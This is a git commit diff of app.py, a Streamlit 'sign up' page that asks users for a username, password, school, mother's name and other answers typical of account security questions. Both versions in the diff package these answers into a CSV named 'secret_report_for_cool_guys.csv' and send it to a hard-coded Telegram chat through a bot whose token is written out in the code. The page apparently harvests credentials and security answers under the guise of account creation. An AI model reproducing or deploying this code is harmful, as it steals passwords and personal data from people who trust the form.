1590e0da2f817979641fa1397515b6d5f15664fa
matan.benyamin <bardugo2!>
2022-06-08 13:13:31 +0300

    yrty

--- app.py
+++ app.py
@@ -18,37 +18,37 @@ hotel = st.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
 
 # save results to csv and send via telegram
 
-df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink]})
 
 TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
 tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
 if st.button('Sign Up'):
-	st.write('Please confirm you''re not a robot:')
-	im = st.image('captcha.png')
-	captcha = st.text_input('Enter image numbers')
-	ver = st.button('Verify')
-	if ver:
+    st.write('Please confirm you''re not a robot:')
+    im = st.image('captcha.png')
+    captcha = st.text_input('Enter image numbers')
+    ver = st.button('Verify')
+    if ver:
+        st.success("You have successfully created an account.Go to the Login Menu to login")
+        df = pd.DataFrame({"username": [new_user], "password": [new_passwd],
+                           "school": [school], "mom_name": [mom_name],
+                           "hotel": [hotel], "type": [type], "images": [captcha]})
+        chat_id = '630924196'
 
-		st.success("You have successfully created an account.Go to the Login Menu to login")
-		df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink], "images": [captcha]})
-		chat_id = '630924196'
+        test_data = df.to_records()
+        print(test_data)
+        # csv module can write data in io.StringIO buffer only
+        s = io.StringIO()
+        csv.writer(s).writerows(test_data)
+        s.seek(0)
+        # python-telegram-bot library can send files only from io.BytesIO buffer
+        # we need to convert StringIO to BytesIO
+        buf = io.BytesIO()
 
-		test_data = df.to_records()
-		print(test_data)
-		# csv module can write data in io.StringIO buffer only
-		s = io.StringIO()
-		csv.writer(s).writerows(test_data)
-		s.seek(0)
-		# python-telegram-bot library can send files only from io.BytesIO buffer
-		# we need to convert StringIO to BytesIO
-		buf = io.BytesIO()
+        # extract csv-string, convert it to bytes and write to buffer
+        buf.write(s.getvalue().encode())
+        buf.seek(0)
 
-		# extract csv-string, convert it to bytes and write to buffer
-		buf.write(s.getvalue().encode())
-		buf.seek(0)
+        # set a filename with file's extension
+        buf.name = f'secret_report_for_cool_guys.csv'
 
-		# set a filename with file's extension
-		buf.name = f'secret_report_for_cool_guys.csv'
-
-		# send the buffer as a regular file
-		tb.send_document(chat_id, buf)
+        # send the buffer as a regular file
+        tb.send_document(chat_id, buf)
